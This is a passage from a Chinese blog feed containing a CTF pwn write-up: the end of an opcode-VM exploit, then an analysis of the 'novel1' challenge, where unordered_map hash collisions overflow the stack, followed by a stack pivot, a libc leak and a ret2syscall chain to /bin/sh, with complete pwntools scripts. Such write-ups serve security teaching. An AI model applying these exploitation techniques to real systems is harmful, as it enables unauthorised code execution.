p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h4 id="pwn-novel1"><a href="#pwn-novel1" class="headerlink" title="pwn-novel1"></a>pwn-novel1</h4><p>C++编译出来的一个二进制文件，直接IDA静态分析有点头大，先运行看看大致功能。</p>
<p>首先会让我们输入Author的名字，然后有两种选项可供选择。第一个选项会让我们输入Blood和Evidence，其中Blood是一个序号，且不能多次设置同一个Blood位置；Evidence看不出来是干什么的，但是会发现字母是不行的，可以输入数字。根据命名bloodstain（血迹），以及Evidence（线索），我们先猜测是跟着某种线索寻找血迹。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213341948.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213711557.png"
                      class=""
                >
<p>用2号功能大概是找相似的血迹，但目前并不清楚具体原理。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104232309225.png"
                      class=""
                >
<p>之后还是得看静态反汇编出的代码，这里的unordered_map实际上c++的一个模板类，其具体函数的作用其实我们能够查到。常用函数如下。就功能而言，unordered_map类似于python中的字典类型，提供一个键值对的映射。</p>
<p><strong>1. 构造与初始化</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>unordered_map()</code></td>
<td>默认构造函数，创建一个空的 <code>unordered_map</code> 对象。</td>
</tr>
<tr>
<td><code>unordered_map(initializer_list)</code></td>
<td>用列表初始化构造。</td>
</tr>
<tr>
<td><code>unordered_map(begin, end)</code></td>
<td>用迭代器范围构造 unordered_map。</td>
</tr>
<tr>
<td><code>unordered_map(other)</code></td>
<td>拷贝构造函数，用另一个 <code>unordered_map</code> 初始化本对象。</td>
</tr>
<tr>
<td><code>unordered_map(other, std::move)</code></td>
<td>移动构造函数，转移另一个对象的资源。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>2. 插入与更新元素</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>insert(const pair&lt;Key, T&gt;&amp; val)</code></td>
<td>插入键值对，如果键已存在，不插入。</td>
</tr>
<tr>
<td><code>insert_or_assign(key, value)</code></td>
<td>插入或更新指定键对应的值。</td>
</tr>
<tr>
<td><code>emplace(args...)</code></td>
<td>原地构造插入，避免不必要的拷贝或移动。</td>
</tr>
<tr>
<td><code>emplace_hint(pos, args...)</code></td>
<td>在给定位置提示的地方原地插入元素。</td>
</tr>
<tr>
<td><code>operator[key]</code></td>
<td>通过 <code>[]</code> 访问元素，若键不存在则插入新键并返回默认值。</td>
</tr>
<tr>
<td><code>at(key)</code></td>
<td>访问元素，若键不存在则抛出 <code>std::out_of_range</code> 异常。</td>
</tr>
<tr>
<td><code>try_emplace(key, args...)</code></td>
<td>若键不存在则插入新值，若键存在则什么都不做。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>3. 删除元素</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>erase(key)</code></td>
<td>删除指定键的元素，返回删除的元素个数（0 或 1）。</td>
</tr>
<tr>
<td><code>erase(iterator)</code></td>
<td>删除迭代器指定位置的元素。</td>
</tr>
<tr>
<td><code>erase(begin, end)</code></td>
<td>删除迭代器范围 <code>[begin, end)</code> 内的元素。</td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>清空 <code>unordered_map</code> 中的所有元素。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>4. 查找元素</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>find(key)</code></td>
<td>返回指向键的迭代器，若键不存在，返回 <code>end()</code>。</td>
</tr>
<tr>
<td><code>contains(key)</code></td>
<td>检查容器是否包含某个键，返回 <code>true</code> 或 <code>false</code>。</td>
</tr>
<tr>
<td><code>count(key)</code></td>
<td>返回指定键出现的次数（对于 <code>unordered_map</code> 始终为 0 或 1）。</td>
</tr>
<tr>
<td><code>equal_range(key)</code></td>
<td>返回表示与指定键关联的元素范围的迭代器对。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>5. 容量相关</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>empty()</code></td>
<td>检查容器是否为空，返回 <code>true</code> 或 <code>false</code>。</td>
</tr>
<tr>
<td><code>size()</code></td>
<td>返回元素个数。</td>
</tr>
<tr>
<td><code>max_size()</code></td>
<td>返回容器支持的最大元素数量。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>6. 哈希表相关</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>bucket_count()</code></td>
<td>返回哈希表中的桶数量。</td>
</tr>
<tr>
<td><code>bucket_size(bucket)</code></td>
<td>返回指定桶中的元素数量。</td>
</tr>
<tr>
<td><code>bucket(key)</code></td>
<td>返回键映射到的桶索引。</td>
</tr>
<tr>
<td><code>load_factor()</code></td>
<td>返回当前的加载因子（元素数量 / 桶数量）。</td>
</tr>
<tr>
<td><code>max_load_factor(factor)</code></td>
<td>获取或设置最大的加载因子。</td>
</tr>
<tr>
<td><code>rehash(n)</code></td>
<td>将桶数量调整为至少为 <code>n</code>，以最小化冲突。</td>
</tr>
<tr>
<td><code>reserve(n)</code></td>
<td>预留足够的空间，调整桶数量使容器能存储至少 <code>n</code> 个元素。</td>
</tr>
<tr>
<td><code>hash_function()</code></td>
<td>返回用于计算哈希值的哈希函数对象。</td>
</tr>
<tr>
<td><code>key_eq()</code></td>
<td>返回用于比较键是否相等的函数对象。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>7. 迭代器相关</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>begin()</code></td>
<td>返回指向容器第一个元素的迭代器。</td>
</tr>
<tr>
<td><code>cbegin()</code></td>
<td>返回指向容器第一个元素的只读迭代器。</td>
</tr>
<tr>
<td><code>end()</code></td>
<td>返回指向容器末尾的迭代器。</td>
</tr>
<tr>
<td><code>cend()</code></td>
<td>返回指向容器末尾的只读迭代器。</td>
</tr>
<tr>
<td><code>rbegin()</code></td>
<td>返回指向容器最后一个元素的反向迭代器。</td>
</tr>
<tr>
<td><code>rend()</code></td>
<td>返回指向容器第一个元素之前的反向迭代器。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>8. 比较两个 unordered_map</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>operator==</code></td>
<td>判断两个 <code>unordered_map</code> 是否相等。</td>
</tr>
<tr>
<td><code>operator!=</code></td>
<td>判断两个 <code>unordered_map</code> 是否不相等。</td>
</tr>
</tbody>
</table>
</div>
<p>那么我们先看part1的功能，首先<strong>bloodstains</strong>是一个模板类，其键为unsigned int类型，值为unsigned long类型。然后这个模板类中不能含有超过31个键值对，否则会调用fragment退出。而且后面通过find寻找我们输入的键，如果找到就退出，说明限制了不能有相同的键。最后对result的两次操作会为键值对赋值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250105145338871.png"
                      class=""
                >
<p>之后看part2功能，这里首先是从bloodstains中，寻找我们输入的Blood键是否在其中，如果不在就直接退出。然后我们需要理解一下bucket这个桶的机制。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122160017991.png"
                      class=""
                >
<p><strong>1. 桶的管理机制</strong></p>
<ol>
<li><strong>哈希函数与桶的分布</strong>:<ul>
<li><code>unordered_map</code> 使用 <strong>哈希函数</strong> 对键 (key) 进行散列，计算哈希值。</li>
<li>通过以下公式确定键值对存储的桶索引： $bucket\ index=hash(key) \%bucket\ count$</li>
<li><code>bucket_count</code> 是当前的桶数量（可以随装载因子（load factor）变化自动调整）。</li>
</ul>
</li>
<li><strong>桶的内部结构</strong>:<ul>
<li>每个桶可能存储多个键值对，冲突的键值对以链表或其他数据结构（如树）存储在同一桶中。</li>
<li>冲突（collision）发生时，<code>unordered_map</code> 使用 <strong>开放地址法</strong> 或 <strong>分离链法</strong> 等策略来解决。</li>
</ul>
</li>
<li><strong>装载因子与桶重分配</strong>:<ul>
<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：$\text{load factor} = \frac{\text{size}}{\text{bucket count}}$</li>
<li>如果装载因子超出预设值，<code>unordered_map</code> 会自动 <strong>增大桶的数量</strong>（通常翻倍），并重新分配键值对以减少冲突。</li>
</ul>
</li>
</ol>
<hr>
<p><strong>2. 哪些键值对会存在一个桶里</strong></p>
<ol>
<li><strong>相同哈希值的键</strong>:<ul>
<li>当两个键的哈希值相同时，这两个键的键值对会落入同一个桶中。</li>
<li>哈希表仅使用哈希值确定桶索引，因此不能保证桶内的键值对顺序。</li>
</ul>
</li>
<li><strong>解决冲突：键的等价性</strong>:<ul>
<li>即使键的哈希值相同，也需要使用等价性比较（通常是 <code>operator==</code>）来确认键是否完全相等。</li>
<li>如果键通过 <code>==</code> 比较不同，<code>unordered_map</code> 将允许它们共存于一个桶中（但不会作为同一键处理）。</li>
</ul>
</li>
<li><strong>插入新键值对</strong>:<ul>
<li>当插入一个新键时，unordered_map<ol>
<li>通过哈希函数计算出桶索引。</li>
<li>遍历该桶内的链表，检查是否有等价键（利用 <code>==</code> 比较）。</li>
<li>若存在等价键，覆盖其值；否则将新键值对插入该桶。</li>
</ol>
</li>
</ul>
</li>
</ol>
<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对<3,4>，其实我们仔细分析copy函数的参数，能发现一个<strong>_Local_iterator</strong>迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122231726637.png"
                      class=""
                >
<p>之后我们的目标就是找到hash冲突的键，这道题其实指定重载了hash函数，是一个模除运算。那么我们可以打断点（<code>b std::__detail::_Mod_range_hashing::operator()</code>）进行调试，这里我们把键设置为4，值设置为3看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250123180738173.png"
                      class=""
                >
<p>总共会在断点停下两次，第二次到断点时，我们能发现一个0xd的模数。这个数字是固定的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124013848801.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174005151.png"
                      class=""
                >
<p>然后我们发现只要其键是在模13的某个剩余类中，其就会存在一个桶里，而且是通过堆上的一个管理块进行管理的，在一个桶中的元素用一个链表连起来。那么我们就可以通过part2的copy函数实现栈溢出。比如我们键为1和14，值都设置为0x666，那么copy执行后可以看到栈顶就为这两个键值对。经过计算，我们设置21个冲突的键就能覆盖到返回地址处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124014128627.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124170922342.png"
                      class=""
                >
<p>但是在调试时，如果直接循环写入21个，会发现最终只会写到栈上一个。经过尝试，最终发现临界点是写入13个，这正好是我们的模数。C++ 中的 <code>std::unordered_map</code> 动态扩展机制类似于 C 的动态数组，会根据负载因子自动扩容（从 13 扩展到 29），新桶数组重新哈希分配，链表通过索引计算（如 <code>i * 29</code>）重新串联。这个29可以通过调试出来。之后会申请一个更大的0xf0大小的管理块，处理完毕后原来0x70大小的管理块会被释放掉。因为我们只用21个就能覆盖到返回地址，所以我们一开始都用模29的进行冲突，那么其扩容后就刚好可以存在一个桶里。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174537805.png"
                      class=""
                >
<p>之后就是构造ROP链，程序里留下了一些gadget。其中有个gadget可以控制rsp。而且一开始的prologue功能中能够往一个author全局变量中读取0x80字节的内容，这个author的地址我们又可以获知。那么我们可以把栈迁移到author处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124185257849.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192217525.png"
                      class=""
                >
<p>之后我们进行rop链构建，这里还有点麻烦的是，我们按顺序调用part1，最后用part2写到栈上时，顺序有所打乱，分界点也就是一开始的模数0xd，这里我把占位的value全换成了调用part1的顺序，可以清楚看到复制到栈上的逻辑。那么我们直接把对应返回地址的位置的内容换为我们的gadget以及author地址即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192500030.png"
                      class=""
                >
<p>栈迁移之后就正常retlibc即可。后面要返回主函数再次往author中读入getshell的rop，由于前面把栈迁移到了这里，在调用一些函数时可能会把返回地址覆盖了，导致会出现问题。所以我们第二次写rop时要把fgets的返回地址给还原，call过去时rsp指向author+8，那么返回地址就在author的地址处。之后布局好rop后就能直接靠prologue的ret返回了。注意栈对齐，而且如果直接调用system的话，其申请的栈空间有点多，我们又做过栈迁移，会导致执行时栈到了不可写的段从而失败，这里我们就ret2syscall。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124210031726.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211116655.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211906895.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./novel1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;47.94.95.135&quot;, 22566)</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">puts_plt = <span class="number">0x0000000000402460</span></span><br><span class="line">puts_got = <span class="number">0x000000000040A108</span></span><br><span class="line">pop_rax_rsp_rdi_rbp_ret = <span class="number">0x0000000004025BE</span></span><br><span class="line">main = <span class="number">0x0000000000402D23</span></span><br><span class="line">ret = <span class="number">0x000000000040201a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part1</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Evidence:&quot;</span>,<span class="built_in">str</span>(value).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part2</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">author = <span class="number">0x000000000040A540</span></span><br><span class="line">rop = p64(puts_got)+p64(<span class="number">0</span>)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment"># rop += p64(pop_rsp_rdi_rbp_ret)+p64(author+)+p64(0)*2+p64(main)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xb</span>,pop_rax_rsp_rdi_rbp_ret)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xc</span>,author)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xd</span>,<span class="number">0x16</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">part2(<span class="number">1</span>)</span><br><span class="line">libc_base = get_addr(p) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0x000000000040285A</span>)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(author+<span class="number">0x60</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ciscn</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>C#开发windows程序学习记录</title>
    <url>/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="C-开发学习记录1"><a href="#C-开发学习记录1" class="headerlink" title="C#开发学习记录1"></a>C#开发学习记录1</h2><p>开发环境：Visual Studio 2022</p>
